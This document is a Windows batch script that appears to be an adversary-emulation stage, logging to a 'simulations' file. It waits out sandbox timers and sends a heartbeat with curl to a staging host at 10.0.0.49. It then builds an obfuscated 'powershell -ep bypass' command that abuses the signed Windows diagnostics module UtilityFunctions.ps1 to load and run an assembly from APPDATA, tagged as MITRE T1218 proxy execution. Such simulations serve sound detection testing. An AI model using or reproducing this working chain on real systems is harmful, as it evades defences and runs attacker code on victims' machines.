@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET txisnba=%APPDATA%\8668\85ed82f8
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8668-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=help.txt
SET dvhhyc=8668
SET logfile=%APPDATA%\!rrocubc!\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_start=stage1_bat>> "!logfile!" 2>nul
timeout /t 35 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_complete>> "!logfile!" 2>nul

SET /A vhjdbz=%RANDOM% %% 20 + 10
timeout /t !vhjdbz! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_!vhjdbz!s>> "!logfile!" 2>nul

curl -k -s -o nul "!keghkgto!"
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_sent>> "!logfile!" 2>nul
ping -n 7 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: ping_delay>> "!logfile!" 2>nul

SET cmd1=p^o^w^e^r^s^h^e^l^l^.^e^x^e -e^p b^y^p^a^s^s -c
SET cmd2=o^m^m^a^n^d "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin !txisnba!\!xzanpex!;[Program.Class]::Dale()"
SET ttp_result=1
SET ttp_err=

!cmd1!!cmd2!
IF NOT !ERRORLEVEL! EQU 0 (
 SET ttp_result=0
 SET ttp_err=assembly_load_failed
)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: lolbin_executed=!ERRORLEVEL!>> "!logfile!" 2>nul

FOR /f "tokens=1-3 delims=/ " %%a IN ("!DATE!") DO SET logdate=20%%c-%%a-%%b
FOR /f "tokens=1-3 delims=:." %%a IN ("!TIME!") DO SET logtime=%%a:%%b:%%c.000
echo [!logdate! !logtime!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Script Proxy Execution=!ttp_result!:!ttp_err!>> "!logfile!" 2>nul

CHOICE /C Y /N /D Y /T 8 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_complete>> "!logfile!" 2>nul